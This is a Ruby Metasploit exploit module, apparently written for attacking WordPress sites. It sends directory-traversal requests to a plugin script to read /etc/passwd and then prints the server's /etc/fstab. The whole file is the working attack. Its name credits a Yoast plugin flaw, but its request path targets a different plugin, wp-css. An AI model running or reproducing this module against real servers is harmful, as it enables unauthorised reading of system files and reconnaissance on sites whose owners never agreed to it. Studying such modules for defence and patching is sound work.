#encoding:utf-8
require 'msf/core'
 class Metasploit3 < Msf::Exploit::Remote
   Rank = GreatRanking
   include Msf::Exploit::Remote::HttpClient
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'WordPress的Yoast插件( v4.1.3) 本地文件包含',
       'Description'    => %q{
       WordPress的Yoast插件( v4.1.3) 本地文件包含
       },
       'Author'         => [ 'tyomcat' ],
       'License'        => BSD_LICENSE,
       'References'     => [ 'http://www.exploit-id.com/web-applications/wordpress-yoast-v4-1-3-local-file-disclosure-vulnerability' ],
       'Privileged'     => false,
       'Platform'       => ['PHP'],
       'Targets'        =>[[ 'WordPress', { }]],
       'Arch'           => ARCH_PHP,
       'DisclosureDate' => '2011-08-26',
       'DefaultTarget' => 0
       ))
     register_options([
         OptString.new('RHOST', [true, 'The DOMAIN', '']),
         OptString.new('RPORT', [true, 'The port', '80']),
         OptString.new('TARGETURI', [true, 'The base path to website', '/']),
      ], self.class)
   end
   def exploit
     url = 'http://'+datastore['RHOST']+':'+datastore['RPORT']+datastore['TARGETURI']
     payload = "wp-content/plugins/wp-css/wp-css-compress.php?f=../../../../../../../../../../etc/passwd"   
     res = send_request_raw({
        'uri'    => url + payload
     }, 20)
     if res.body =~ /root/ and res.body =~ /bin/
       print_good("Target is vulnerable!")
       payload2 = "wp-content/plugins/wp-css/wp-css-compress.php?f=../../../../../../../../../../etc/fstab"
       res = send_request_raw({
        'uri'    => url + payload2
       }, 20)
       root = res.body
       if res.code.to_s == '200'
    		print_good("存储设备及其文件系统的信息:")
			print_good(root)
       else
         print_error("Get information error!")
       end
     else
       print_error('Target is not vlnerable!')
     end
   end
 end
